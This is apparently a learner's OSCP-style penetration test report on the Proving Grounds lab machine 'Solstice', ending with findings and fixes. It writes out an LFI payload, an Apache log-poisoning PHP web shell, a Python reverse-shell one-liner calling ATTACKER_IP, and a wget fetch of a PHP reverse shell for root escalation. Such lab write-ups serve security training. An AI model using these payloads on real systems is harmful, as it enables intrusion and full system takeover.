# PG Play Solstice - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-14

---

## 1. Executive Summary

A penetration test was conducted against the target host “Solstice” in the Offensive Security Proving Grounds Play environment. The assessment identified multiple vulnerable services including exposed FTP services, a Squid proxy, and vulnerable PHP web applications.

Initial access was achieved by exploiting a Local File Inclusion (LFI) vulnerability on TCP port 8593 and abusing Apache access log poisoning to gain remote command execution as the `www-data` user.

Post-exploitation enumeration identified sensitive application configuration files containing default credentials and a world-writable PHP file owned by root. Privilege escalation to root was achieved by overwriting a PHP file served internally on localhost TCP port 57, resulting in arbitrary code execution as root.

The assessment demonstrated full compromise of the target system.

---

## 2. Scope

- **Target:** 192.168.225.72
- **Environment:** PG Play Solstice
- **Testing Window:** 2026-5-14
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 192.168.225.72 -T4 -oA solstice_tcp
```

Relevant Output:

```
21/tcp    open  ftp         pyftpdlib 1.5.6
22/tcp    open  ssh         OpenSSH 7.9p1 Debian
25/tcp    open  smtp        Exim smtpd
80/tcp    open  http        Apache httpd 2.4.38
2121/tcp  open  ftp         pyftpdlib 1.5.6
3128/tcp  open  http-proxy  Squid Proxy 4.6
8593/tcp  open  http        PHP cli server 5.5
54787/tcp open  http        PHP cli server 5.5
62524/tcp open  ftp         FreeFloat ftpd 1.00
```

Interpretation:

The target exposed multiple web and FTP services, including Squid Proxy and multiple PHP development servers.

### Anonymous FTP Enumeration

Command:

```
ftp 192.168.225.72 2121
```

Relevant Output:

```
230 Login successful.
Remote system type is UNIX.
drwxrwxrwx 2 www-data www-data 4096 Jan 18 2020 pub
```

Interpretation:

Anonymous FTP access was enabled and exposed a writable directory owned by `www-data`.

---

## 5. Enumeration

### Squid Proxy Enumeration

The Squid proxy service on TCP port 3128 was configured in FoxyProxy for web enumeration.

Attempting to access internal services through the proxy resulted in access denied responses.

Interpretation:

The proxy exposed limited internal access but indicated the presence of internal-only web services.

### Web Enumeration

The following web services were identified:

- Port 80:
  - “Currently configuring the database, try later.”
- Port 8593:
  - “Main Page Book List”
- Port 54787:
  - HTTP service present

Interpretation:

The PHP application on TCP port 8593 became the primary attack surface.

### Local File Inclusion Discovery

A Local File Inclusion vulnerability was identified in the `book` parameter.

URL:

```
http://192.168.225.72:8593/index.php?book=list
```

Testing LFI:

```
http://192.168.225.72:8593/index.php?book=/../../../../../../etc/passwd
```

Relevant Output:

```
miguel:x:1000:1000:miguel:/home/miguel:/bin/bash
```

Interpretation:

The application failed to sanitize user-supplied file paths, allowing arbitrary file disclosure.

---

## 6. Initial Access

### Apache Access Log Poisoning

A malicious HTTP request containing embedded PHP code was sent to the Apache web service.

Command:

```
nc -nv 192.168.225.72 80
```

Payload:

```
thisislogpoisoning/<?php passthru($_GET['cmd']); ?>
```

Interpretation:

The injected PHP payload was written into the Apache access log.

### Include Poisoned Apache Access Log

The Local File Inclusion vulnerability was used to include the poisoned Apache access log.

Request:

```
http://192.168.225.72:8593/index.php?book=/../../../../var/log/apache2/access.log
```

Interpretation:

The vulnerable PHP application processed the poisoned log file and executed attacker-controlled PHP code.

### Remote Command Execution

A reverse shell payload was executed through the `cmd` parameter.

Listener:

```
nc -lvnp 443
```

Request:

```
http://192.168.225.72:8593/index.php?book=/../../../../var/log/apache2/access.log&cmd=python3%20-c%20'import%20os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn("bash")'
```

Interpretation:

The target connected back to the attacker machine, resulting in command execution as `www-data`.

### Shell Verification

Commands:

```
whoami

hostname

ip a
```

Relevant Output:

```
www-data
solstice
```

Interpretation:

Initial access was achieved as the `www-data` user.

### Shell Stabilization

Command:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm
```

Interpretation:

The shell was stabilized for interactive post-exploitation activities.

---

## 7. Post-Exploitation

### Application Enumeration

A suspicious FTP application was identified.

Command:

```
cat /var/tmp/fake_ftp/script.py
```

Interpretation:

The script implemented a fake FreeFloat FTP service.

### Credential Discovery

Sensitive credentials were discovered in application configuration files.

Command:

```
cat /var/tmp/webserver_2/project/config.php
```

Relevant Output:

```
admin : admin
```

A second configuration file revealed additional credentials.

Command:

```
cat /var/tmp/webserver_2/projects/config.sample.php
```

Relevant Output:

```
root : newpass
```

Interpretation:

Default credentials were stored insecurely within application configuration files.

### Writable PHP File Discovery

A world-writable PHP file owned by root was identified.

Command:

```
find / -writable -type f 2>/dev/null | grep ".php"
```

Relevant Output:

```
/var/tmp/sv/index.php
```

Interpretation:

The PHP file was writable by the low-privileged user despite being owned by root.

### Internal Service Enumeration

Listening services were identified.

Command:

```
netstat -tunlp
```

Relevant Output:

```
tcp   0   0 127.0.0.1:57   0.0.0.0:*   LISTEN
```

Testing the service:

Command:

```
curl http://127.0.0.1:57
```

Relevant Output:

```
Under construction
```

Interpretation:

The localhost-only web service appeared to serve the writable PHP file.

---

## 8. Privilege Escalation

### Replace Writable PHP File

A PHP reverse shell was copied to the writable file location.

Command:

```
wget http://ATTACKER_IP/index.php
```

Command:

```
chmod +x index.php
```

Interpretation:

The writable PHP file was replaced with a malicious PHP reverse shell.

### Trigger Root-Level Execution

Listener:

```
nc -lvnp 443
```

Command:

```
curl http://127.0.0.1:57
```

Relevant Output:

```
connection received
```

Commands:

```
whoami

hostname

ip a
```

Relevant Output:

```
root
solstice
```

Interpretation:

The internal service executed the modified PHP file as root, resulting in privilege escalation.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /var/www/local.txt
```

**Root Flag**: *REDACTED*

```
cat /root/proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Local File Inclusion Allowing Arbitrary File Read and Code Execution

**Severity:** Critical

**Description:**
The PHP application failed to sanitize user-controlled file paths, allowing attackers to include arbitrary local files and execute injected PHP code through Apache access log poisoning.

**Impact:**
Attackers could disclose sensitive files, execute arbitrary commands, and fully compromise the target system.

**Recommendation:**
Implement strict input validation, use allowlists for included files, disable dangerous PHP functions where possible, and avoid dynamic file inclusion using unsanitized user input.

### **Finding:** Insecure Storage of Credentials in Configuration Files

**Severity:** High

**Description:**
Application configuration files contained plaintext credentials accessible to low-privileged users.

**Impact:**
Attackers could recover valid credentials and leverage them for lateral movement or privilege escalation.

**Recommendation:**
Store secrets securely using environment variables or secret management solutions and restrict filesystem permissions on sensitive files.

### **Finding:** World-Writable PHP File Executed as Root

**Severity:** Critical

**Description:**
A PHP file executed by a root-owned internal web service was writable by low-privileged users.

**Impact:**
Attackers could modify the executed PHP file and obtain arbitrary code execution as root.

**Recommendation:**
Restrict write permissions on executable files, enforce least privilege, and separate privileged services from writable directories.

---

## 11. Appendix

LFI to RCE via Apache Log Poisoning -
https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1/
